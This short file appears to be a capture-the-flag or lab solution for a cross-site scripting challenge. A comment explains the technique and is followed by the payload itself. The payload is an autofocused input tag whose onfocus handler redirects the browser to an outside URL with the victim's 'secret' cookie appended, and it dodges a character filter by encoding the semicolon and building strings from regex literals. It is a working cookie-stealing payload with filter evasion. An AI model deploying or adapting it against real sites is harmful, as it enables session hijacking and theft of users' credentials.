/*onfocus attribute --> fires the moment that the element gets focus, it is
                        used inside the input tag. In this script it contains
                        the location.replace method which replaces the current
                        document with a new one.  
  Because of the fact that there could be more than one cookie and that the 
  required one is just the secret cookie, it is necessary to find a way to 
  obtain it without using the banned characters.
  NB. It is not possible to put ; so it is encoded as \x3b

*/

<&input type=text value=https://url/ 
onfocus=window.location.replace(this.value+document.cookie.split(String(/secret=/).substring(1,8))[1].split(/\x3b/)[0]) autofocus></input> 